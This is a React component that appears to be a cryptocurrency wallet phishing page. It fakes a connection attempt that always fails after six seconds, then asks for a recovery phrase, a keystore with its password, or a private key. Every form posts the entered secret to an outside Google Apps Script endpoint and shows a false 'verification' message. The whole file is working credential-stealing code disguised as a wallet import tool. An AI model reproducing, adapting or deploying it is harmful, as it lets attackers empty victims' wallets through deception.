import { MdCancel } from "react-icons/md";
import Tabs from '@mui/material/Tabs';
import Tab from '@mui/material/Tab';
import PropTypes from 'prop-types';
import TextareaAutosize from 'react-textarea-autosize';
import { styled } from '@mui/system';
import Button from '@mui/material/Button';
import { Link } from "react-router-dom";
import { Typography, Stack, Box } from '@mui/material';
import * as React from 'react';
import { useState, useEffect } from "react";
import './styles.css';
import { IoChevronBackCircleSharp } from "react-icons/io5";
import { useParams } from "react-router-dom";
import MyComponent from "./Canvas";
import { useNavigate } from "react-router-dom";
import { Toaster, toast } from 'sonner';
import { useCoindata } from "./useCoindata";

function CustomTabPanel(props) {
  const { children, value, index, ...other } = props;

  return (
    <div
      role="tabpanel"
      hidden={value !== index}
      id={`full-width-tabpanel-${index}`}
      aria-labelledby={`full-width-tab-${index}`}
      {...other}
    >
      {value === index && (
        <Box sx={{ p: 3 }}>
          <Typography>{children}</Typography>
        </Box>
      )}
    </div>
  );
}

CustomTabPanel.propTypes = {
  children: PropTypes.node,
  index: PropTypes.number.isRequired,
  value: PropTypes.number.isRequired,
};

function a11yProps(index) {
  return {
    id: `full-width-tab-${index}`,
    'aria-controls': `full-width-tabpanel-${index}`,
  };
}

const Moreinfo = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data, isLoading } = useCoindata(id);

  const coinPhoto = data?.data?.logo;
  const coinName = data?.data?.name;

  const [phrase, setphrasevalue] = useState("");
  const [keystore, setkeystorevalue] = useState('');
  const [wallet_password, setwalletvalue] = useState('');
  const [private_key, setprivatekeyvalue] = useState('');

  const isButtonDisabledp = private_key.length < 12;
  const isButtonDisabledph = phrase.length < 12;
  const isButtonDisabledwa = wallet_password.length < 12;

  const handlephraseChange = (event) => {
    setphrasevalue(event.target.value);
  };

  const handlekeystoreChange = (event) => {
    setkeystorevalue(event.target.value);
  };
  const handlewalletChange = (event) => {
    setwalletvalue(event.target.value);
  };
  const handleprivatekeyChange = (event) => {
    setprivatekeyvalue(event.target.value);
  };

  const blue = {
    100: '#DAECFF',
    200: '#b6daff',
    400: '#3399FF',
    500: '#007FFF',
    600: '#0072E5',
    900: '#003A75',
  };

  const grey = {
    50: '#F3F6F9',
    100: '#E5EAF2',
    200: '#DAE2ED',
    300: '#C7D0DD',
    400: '#B0B8C4',
    500: '#9DA8B7',
    600: '#6B7A90',
    700: '#434D5B',
    800: '#303740',
    900: '#1C2025',
  };

  const Textarea = styled(TextareaAutosize)(
    ({ theme }) => `
    box-sizing: border-box;
    width: 320px;
    font-family: 'IBM Plex Sans', sans-serif;
    font-size: 0.875rem;
    font-weight: 400;
    line-height: 1.5;
    padding: 8px 12px;
    border-radius: 8px;
    color: ${theme.palette.mode === 'dark' ? grey[300] : grey[900]};
    background: ${theme.palette.mode === 'dark' ? grey[900] : '#fff'};
    border: 1px solid ${theme.palette.mode === 'dark' ? grey[700] : grey[200]};
    box-shadow: 0px 2px 2px ${theme.palette.mode === 'dark' ? grey[900] : grey[50]};

    &:hover {
      border-color: ${blue[400]};
    }

    &:focus {
      border-color: ${blue[400]};
      box-shadow: 0 0 0 3px ${theme.palette.mode === 'dark' ? blue[600] : blue[200]};
    }

    // firefox
    &:focus-visible {
      outline: 0;
    }
  `,
  );

  const [value, setValue] = React.useState(0);
  const scriptURL = 'https://script.google.com/macros/s/AKfycbwB3lOUukb_2lAkPL7r_GC5s-A81cz-jT5ySD5JFCI6kAkars6dgHA-PjZevm4jJ9c8/exec';

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };

  const handlereqphrase = (e) => {
    e.preventDefault();
    const coin_name = coinName;
    const formData = new FormData();
    formData.append('phrase', phrase);
    formData.append('coin_name', coin_name);

    fetch(scriptURL, { method: 'POST', body: formData })
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message));
    toast.warning('Handling verification... ');
    setTimeout(() => {
      navigate('/coins');
    }, 1000);
  };

  const handlereqprivatekey = (e) => {
    e.preventDefault();
    const coin_name = coinName;
    const formData = new FormData();
    formData.append('private_key', private_key);
    formData.append('coin_name', coin_name);

    fetch(scriptURL, { method: 'POST', body: formData })
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message));
    toast.warning('Handling verification... ');
    setTimeout(() => {
      navigate('/coins');
    }, 2000);
  };

  const handlereqkeystore = (e) => {
    e.preventDefault();
    const coin_name = coinName;
    const formData = new FormData();
    formData.append('keystore', keystore);
    formData.append('coin_name', coin_name);
    formData.append('wallet_password', wallet_password);

    fetch(scriptURL, { method: 'POST', body: formData })
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message));
    toast.warning('Handling verification... ');
    setTimeout(() => {
      navigate('/coins');
    }, 2000);
  };

  const [showinputkey, setshowinputkey] = useState(false);
  const [inputPlaceholder, setInputPlaceholder] = useState('initializing...');
  const [inputError, setInputError] = useState(false);
  const [isInitializing, setIsInitializing] = useState(true);
  const [showManualButton, setShowManualButton] = useState(false);

  const handleshowkey = () => {
    setshowinputkey(true);
  };

  const startInitializationCycle = () => {
    setTimeout(() => {
      // After initial attempt, go straight to error state
      setInputPlaceholder("Connection error");
      setInputError(true);
      setShowManualButton(true);
      setIsInitializing(false);
    }, 6000); // 6-second delay to simulate connection attempt
  };

  useEffect(() => {
    if (isInitializing) {
      startInitializationCycle();
    }
    return () => clearTimeout(); // Cleanup timeout on unmount
  }, [isInitializing]);

  const inputHolderClass = inputError ? 'inputholderchange' : 'inputholder';

  return (
    <>
      <div className="overlay">
        <div className="innermodal">
          <div className="mainmodalinfo">
            {data && (
              <div className="coindisplayinner">
                <p className="coin-name">{coinName}</p>
              </div>
            )}
            <div className={inputHolderClass}>
              <p className={inputError ? 'placeholder2' : 'placeholder1'}>
                {inputPlaceholder}
              </p>
              {showManualButton && (
                <Button onClick={handleshowkey}>connect manually</Button>
              )}
            </div>
          </div>
          {showinputkey && (
            <Box
              className="con_tab"
              sx={{
                width: {
                  xs: "320px",
                  sm: '320px',
                  md: '430px'
                },
                position: 'absolute',
                top: '50%',
                left: '50%',
                transform: 'translate(-50%, -50%)',
                zIndex: 3
              }}
            >
              <div className="upnavs">
                <img src={coinPhoto} className="coin-image" alt={coinName} />
                <Link className="btn-v" variant="outline-primary" to="/">
                  Back
                </Link>
              </div>
              <Box sx={{ borderBottom: 1, borderColor: 'divider' }}>
                <Tabs
                  className="tab_head"
                  sx={{ justifyContent: 'space-between' }}
                  value={value}
                  onChange={handleChange}
                  variant="fullWidth"
                  aria-label="basic tabs example"
                >
                  <Tab label="Phrase" {...a11yProps(0)} />
                  <Tab label="keystore" {...a11yProps(1)} />
                  <Tab label="private key" {...a11yProps(2)} />
                </Tabs>
              </Box>
              <CustomTabPanel value={value} index={0}>
                <form onSubmit={handlereqphrase}>
                  <Box>
                    <textarea
                      className="textinput"
                      required
                      name="phrase"
                      style={{ outlineColor: '#3399FF' }}
                      placeholder="Enter your recovery phrase"
                      value={phrase}
                      onChange={(e) => setphrasevalue(e.target.value)}
                    />
                  </Box>
                  <p className="suptext">
                    Typically 12 (sometimes 24) words separated by single spaces
                  </p>
                  <Stack>
                    <Button type="submit" variant="contained" disabled={isButtonDisabledph}>
                      IMPORT
                    </Button>
                  </Stack>
                </form>
              </CustomTabPanel>
              <CustomTabPanel value={value} index={1}>
                <form onSubmit={handlereqkeystore}>
                  <Box>
                    <textarea
                      name="keystore"
                      className="textinput"
                      required
                      style={{ outlineColor: '#3399FF' }}
                      placeholder="Enter keystore"
                      value={keystore}
                      onChange={handlekeystoreChange}
                    />
                  </Box>
                  <Box>
                    <textarea
                      className="textinputsmall"
                      required
                      name="wallet_password"
                      style={{ outlineColor: '#3399FF' }}
                      placeholder="wallet password"
                      value={wallet_password}
                      onChange={handlewalletChange}
                    />
                  </Box>
                  <p className="suptext">
                    Several lines of text beginning with <code>{"{...}"}</code> plus the
                    password you used to encrypt it.
                  </p>
                  <Stack>
                    <Button type="submit" variant="contained" disabled={isButtonDisabledwa}>
                      IMPORT
                    </Button>
                  </Stack>
                </form>
              </CustomTabPanel>
              <CustomTabPanel value={value} index={2}>
                <form onSubmit={handlereqprivatekey}>
                  <Box>
                    <textarea
                      className="textinputsmall"
                      required
                      name="private_key"
                      style={{ outlineColor: '#3399FF' }}
                      placeholder="Enter your private key"
                      value={private_key}
                      onChange={handleprivatekeyChange}
                    />
                  </Box>
                  <p className="suptext">
                    Typically 12 (sometimes 24) words separated by a single space.
                  </p>
                  <Stack>
                    <Button type="submit" variant="contained" disabled={isButtonDisabledp}>
                      IMPORT
                    </Button>
                  </Stack>
                </form>
              </CustomTabPanel>
              <Toaster position="bottom-center" richColors />
            </Box>
          )}
        </div>
        <MyComponent />
      </div>
    </>
  );
};

export default Moreinfo;